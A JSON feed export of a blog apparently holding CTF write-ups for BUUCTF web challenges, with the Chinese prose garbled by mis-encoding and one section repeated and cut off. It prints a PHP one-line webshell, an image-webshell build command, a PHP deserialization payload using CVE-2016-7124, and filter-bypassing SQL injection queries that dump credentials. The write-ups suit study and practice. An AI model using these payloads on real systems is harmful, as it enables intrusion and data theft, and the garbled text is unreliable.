{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0çš„ç§˜å¯†èŠ±å›­ â€¢ All posts by \"å¤§å†’é™©\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/06/29/dmx/buuctf-web/",
            "url": "http://example.com/2021/06/29/dmx/buuctf-web/",
            "title": "Buuctf-web æ­¦æ—ç§˜ç±",
            "date_published": "2021-06-29T03:30:13.000Z",
            "content_html": "<h2 id=\"æå®¢å¤§æŒ‘æˆ˜2019-upload\"><a class=\"markdownIt-Anchor\" href=\"#æå®¢å¤§æŒ‘æˆ˜2019-upload\">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 upload</h2>\n<p><em>å…³é”®è¯ï¼šphpï¼Œphtmlï¼Œè¿‡æ»¤ &lt;?ï¼Œæ–‡ä»¶ä¸Šä¼ </em></p>\n<p>æ ¹æ® Content-Type åˆ¤æ–­å›¾ç‰‡ï¼šContent-Type: image/png</p>\n<p>è¿‡æ»¤â€™&lt;?â€™ï¼Œä¼  phtml ä¸€å¥è¯æœ¨é©¬</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>phtml ç®€å•æ¥è¯´å°±æ˜¯å°† php åµŒå…¥ html ä¸­</p>\n<p>(è¿™é¢˜å¾ˆè¯¡å¼‚çš„æ˜¯æˆ‘ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ï¼Œå›æ˜¾ Not Image)</p>\n<hr>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜2019-php\"><a class=\"markdownIt-Anchor\" href=\"#æå®¢å¤§æŒ‘æˆ˜2019-php\">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 php</h2>\n<p><em>å…³é”®è¯ï¼šphp ååºåˆ—åŒ–ï¼Œç½‘ç«™å¤‡ä»½ï¼Œphp ä»£ç å®¡è®¡</em></p>\n<p>ğŸ€ç½‘ç«™å¤‡ä»½æ–‡ä»¶åçŒœæµ‹ï¼Œå«Œéº»çƒ¦ç›´æ¥ä¸Šç›®å½•æ‰«æï¼Œä¸º www.zip</p>\n<p>www.zip ä¸­åŒ…å«çš„æ–‡ä»¶ä¸»è¦ä¸º index.phpï¼Œclass.phpï¼Œflag.php</p>\n<p>ğŸ€index.php ä¸­å…³é”®ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;class.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$select</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;select&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$res</span>=unserialize(@<span class=\"variable\">$select</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ä» get è¯·æ±‚ä¸­è·å–â€™selectâ€™çš„å€¼ï¼Œå†å°†è¯¥å˜é‡ååºåˆ—åŒ–ï¼ˆå…¶ä¸­å˜é‡å‰åŠ  @æ˜¯ä¸ºäº†é˜²æ­¢æŠ¥é”™ä¿¡æ¯è¾“å‡ºï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼‰</p>\n<p>ğŸ€class.php ä¸­ Name å¯¹è±¡ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">O:<span class=\"number\">4</span><span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;password&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>ä»__destruct () å‡½æ•°ä¸­çš„é€»è¾‘æ¥çœ‹ï¼Œåªæœ‰å½“ password=100ï¼Œusername=admin æ—¶ï¼Œä¼šè¾“å‡º flag çš„å€¼</p>\n<p>__construct æ„é€ å‡½æ•°ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„å€¼èµ‹å€¼ç»™å˜é‡ password å’Œ usernameï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–åä¼šè°ƒç”¨__wakeup ()ï¼Œå°† username èµ‹å€¼ä¸º guest</p>\n<p><strong>CVE-2016-7124ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup çš„æ‰§è¡Œ</strong></p>\n<p>ğŸ‘†ğŸ‘†ğŸ‘†é€šè¿‡ä¸Šè¿°æ¼æ´å¯ä»¥è·³è¿‡__wakeup () çš„æ‰§è¡Œ</p>\n<p>æ„é€  exp.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> Name();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">2</span>ï¼š&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>ä½†æ˜¯ç”¨ url ç¼–ç è¾“å‡ºä¸ºï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A3%<span class=\"number\">3</span>A%<span class=\"number\">22100</span>%<span class=\"number\">22</span>%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br></pre></td></tr></table></figure>\n<p>åœ¨ Nameusernameï¼ŒNamepassword ä¸­ï¼Œç±»åä»¥åŠå˜é‡åå‰éƒ½å­˜åœ¨ä¸å¯è§å­—ç¬¦ %00</p>\n<p>å› ä¸º private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š ascii ä¸º 0 çš„å­—ç¬¦ (ä¸å¯è§å­—ç¬¦)</p>\n<p>â­payload éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ä¸ºæˆå‘˜å˜é‡ä¸ªæ•°ï¼Œä»¥åŠç§æœ‰å­—æ®µå‰å¢åŠ  %00 (url ç¼–ç çš„ä¸å¯è§å­—ç¬¦)</p>\n<p>payloadï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select=O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;%00Name%00username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;%00Name%00password&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>æ€»ç»“</strong></p>\n<p>ğŸŒ°<a href=\"https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/\">å¤‡ä»½æ–‡ä»¶å‚è€ƒ</a></p>\n<p>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€ï¼štarã€tar.gzã€zipã€rar</p>\n<p>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åï¼šwebã€websiteã€backupã€backã€wwwã€wwwrootã€temp</p>\n<p>ğŸŒ°<a href=\"https://www.php.net/manual/zh/language.oop5.magic.php\">php é­”æœ¯æ–¹æ³•</a></p>\n<p>serialize () æ—¶ï¼Œè‹¥å­˜åœ¨__sleep ()ï¼Œä¼šå…ˆè°ƒç”¨__sleep ()ï¼Œå†æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</p>\n<p>unserialize () æ—¶ï¼Œè‹¥å­˜åœ¨__wakeup ()ï¼Œååºåˆ—åŒ–åä¼šè°ƒç”¨__wakeup ()</p>\n<hr>\n<h2 id=\"actf2020-æ–°ç”Ÿèµ›-upload1\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-æ–°ç”Ÿèµ›-upload1\">#</a> ACTF2020 æ–°ç”Ÿèµ› Upload1</h2>\n<p><em>å…³é”®è¯ï¼šå›¾ç‰‡é©¬</em></p>\n<p>ğŸ´åˆæˆå›¾ç‰‡é©¬å‘½ä»¤ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 2.jpg/b + shell.php/a shell.jpg</span><br></pre></td></tr></table></figure>\n<p>ä¸Šä¼  shell.jpgï¼ŒæŠ“åŒ…æ›´æ”¹åç¼€åä¸º phpï¼Œå›æ˜¾ nonono~ Bad fileï¼</p>\n<p>æ›´æ”¹åç¼€åä¸ºéšæœºä¹±ç å­—ç¬¦ï¼Œå›æ˜¾ä¸Šä¼ æˆåŠŸï¼Œç›®æµ‹è®¾ç½®é»‘åå•</p>\n<p><img src=\"buuctf-web1.png\" alt=\"\"></p>\n<p>è®¾ç½® phtml åç¼€åï¼Œç»•è¿‡æˆåŠŸ</p>\n<p>shell.phpï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>åˆæˆå›¾ç‰‡é©¬ï¼Œä¸Šä¼ æ”¹åç¼€ï¼Œè¿ shell</p>\n<hr>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-babysql1\"><a class=\"markdownIt-Anchor\" href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-babysql1\">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 BabySQL1</h2>\n<p><em>å…³é”®è¯ï¼šsql æ³¨å…¥ã€è¿‡æ»¤å…³é”®å­—ã€è¿‡æ»¤ç‰¹æ®Šç¬¦å·ã€å­—ç¬¦æ‹¼æ¥</em></p>\n<p>çœ‹é¢˜ï¼Œç™»å½•æ¡† sql æ³¨å…¥</p>\n<p>ç»æµ‹è¯•ï¼Œå‘ç°è¿‡æ»¤å­—ç¬¦ï¼šselectï¼Œsleepï¼Œ*ï¼Œandï¼Œorï¼Œunionâ€¦</p>\n<p>å“ˆå“ˆå¾ˆå¤šå¸¸ç”¨çš„å˜›ï¼Œä¸æµ‹äº†</p>\n<p><img src=\"buuctf-web2.png\" alt=\"\"></p>\n<p>è€ƒè™‘ä½¿ç”¨å­—ç¬¦æ‹¼æ¥ç»•è¿‡å…³é”®è¯æ£€æµ‹ï¼Œ%2b ä¸ºâ€™+â€˜url ç¼–ç ï¼Œç›´æ¥ä½¿ç”¨â€™+' ä¼šè¢«è½¬æˆç©ºæ ¼ï¼Œpayloadï¼š</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; an%2bd+slee%2bp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>ç„¶åçœ‹ç€é¢˜ç›®ï¼Œå‘ç°è¿‡æ»¤çš„å…³é”®å­—éƒ½ç½®ç©ºçš„ï¼ŒåŒå†™ä¹Ÿèƒ½ç»•è¿‡</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; anandd sleesleepp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>æ‰“ç‚¹åˆ°æ­¤ç»“æŸâ­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­</p>\n<p>ç›´æ¥ç™»å½•è·å¾—çš„å¹¶ä¸æ˜¯ flagï¼Œç»§ç»­æ‰¾ ï¼Œorder by å‘ç°ä¸º 3 ä¸ªå­—æ®µ</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; o%2brder b%2by 4--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>å›æ˜¾çš„å­—æ®µä¸º 2ï¼Œ3</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,2,3--+</span></span><br></pre></td></tr></table></figure>\n<p>çˆ†è¡¨ï¼Œä» information_schema.tables ä¸­æŸ¥æ‰¾å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨åï¼Œæ‹¼æ¥åœ¨ä¸€èµ·ååœ¨ç¬¬äºŒä¸ªå­—æ®µè¾“å‡º</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(table_name),3 fr%2bom info%2brmation_schema.tables whe%2bre ta%2bble_schema=database()--+</span></span><br></pre></td></tr></table></figure>\n<p>çˆ†å­—æ®µ</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(column_name),3 fr%2bom info%2brmation_schema.columns whe%2bre ta%2bble_name=&#x27;</span>b4bsql<span class=\"string\">&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello id,username,passwordï¼</span><br></pre></td></tr></table></figure>\n<p>ç„¶åå‘ç°ä¸¤ä¸ªè¡¨å­—æ®µéƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£æ‰¾ b4bsql ä¸­çš„æ•°æ®å§</p>\n<p>æ‹¼æ¥æ¯è¡Œæ•°æ®ï¼Œå¹¶ç”¨ â€” éš”å¼€</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(concat_ws(&#x27;</span><span class=\"comment\">---&#x27;,username,passwo%2brd)),3 fr%2bom b4bsql--+</span></span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<p><img src=\"buuctf-web3.png\" alt=\"\"></p>\n<p><strong>æ€»ç»“</strong></p>\n<p><a href=\"https://www.cnblogs.com/apolloren/p/11002449.html\">SQL å­—ç¬¦ä¸²æ‹¼æ¥</a></p>\n<hr>\n<h2 id=\"actf2020-æ–°ç”Ÿèµ›-backupfile1\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-æ–°ç”Ÿèµ›-backupfile1\">#</a> ACTF2020 æ–°ç”Ÿèµ› BackupFile1</h2>\n<p><em>å…³é”®è¯ï¼šis_numeric () ç»•è¿‡ï¼Œ== ç»•è¿‡ï¼Œphp å¼±ç±»å‹æ¯”è¾ƒè¡¨</em></p>\n<p>çœ‹é¢˜ï¼Œæ‰¾å¤‡ä»½æ–‡ä»¶ï¼Œindex.php.bak</p>\n<p>ğŸ´index.php ä»£ç å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];    <span class=\"keyword\">if</span>(!is_numeric(<span class=\"variable\">$key</span>)) &#123;        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);    &#125;    <span class=\"variable\">$key</span> = intval(<span class=\"variable\">$key</span>);    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;    &#125;&#125;<span class=\"keyword\">else</span> &#123;    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>åˆ†æ 1ï¸âƒ£ä¸‹ï¼Œget ä¼ é€’å‚æ•° key</p>\n<p>key é€šè¿‡ is_numeric åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ï¼Œå†é€šè¿‡ intval è·å–å˜é‡ key çš„æ•´æ•°å€¼</p>\n<p>æœ€åå¦‚æœå˜é‡ key==â€œ123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3â€ï¼Œè¾“å‡º flag</p>\n<p>ãƒ¾ (ï½¡ï½€Ğ”Â´ï½¡) å¹²å˜›å¹²å˜›å‘¢è¿™æ˜¯ï¼Œæ°”äºº</p>\n<p>áƒš(â•¹â—¡â•¹áƒš) å¥½äº†ï¼Œç™¾åº¦å®Œå›æ¥äº†</p>\n<p>is_numeric ()ï¼Œå¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢æˆ 16 è¿›åˆ¶ï¼Œç»•è¿‡åˆ¤æ–­ï¼ˆç»å¸¸é€ æˆ sql æ³¨å…¥ï¼‰</p>\n<p>intval ()ï¼Œè·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œé»˜è®¤ä¸ºåè¿›åˆ¶</p>\n<p>==ï¼Œå¼±ç±»å‹æ¯”è¾ƒï¼Œå½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œåªæå–å­—ç¬¦ä¸²ä¸­å¼€å¤´çš„æ•´æ•°éƒ¨åˆ†</p>\n<p>â­ç„¶åçªç„¶å‘ç° str æ˜¯ä»¥ 123 å¼€å¤´ï¼Œå¼±ç±»å‹æ¯”è¾ƒæ˜¯ç­‰äº 123 çš„</p>\n<p>å¥½äº† payloadï¼š?key=123ï¼ŒæˆåŠŸæ‹¿åˆ° flag</p>\n<p>â€¦(ï¼¿ ï¼¿) ãƒï½œå£</p>\n<hr>\n<h2 id=\"actf2020-æ–°ç”Ÿèµ›-backupfile1-2\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-æ–°ç”Ÿèµ›-backupfile1-2\">#</a> ACTF2020 æ–°ç”Ÿèµ› BackupFile1</h2>\n<p><em>å…³é”®è¯ï¼šis_numeric () ç»•è¿‡ï¼Œ== ç»•è¿‡ï¼Œphp å¼±ç±»å‹æ¯”è¾ƒè¡¨</em></p>\n<p>çœ‹é¢˜ï¼Œæ‰¾å¤‡ä»½æ–‡ä»¶ï¼Œindex.php.bak</p>\n<p>ğŸ´index.php ä»£ç å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];    <span class=\"keyword\">if</span>(!is_numeric(<span class=\"variable\">$key</span>)) &#123;        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);    &#125;    <span class=\"variable\">$key</span> = intval(<span class=\"variable\">$key</span>);    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;    &#125;&#125;<span class=\"keyword\">else</span> &#123;    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>åˆ†æ 1ï¸âƒ£ä¸‹ï¼Œget ä¼ é€’å‚æ•° key</p>\n<p>key é€šè¿‡ is_numeric 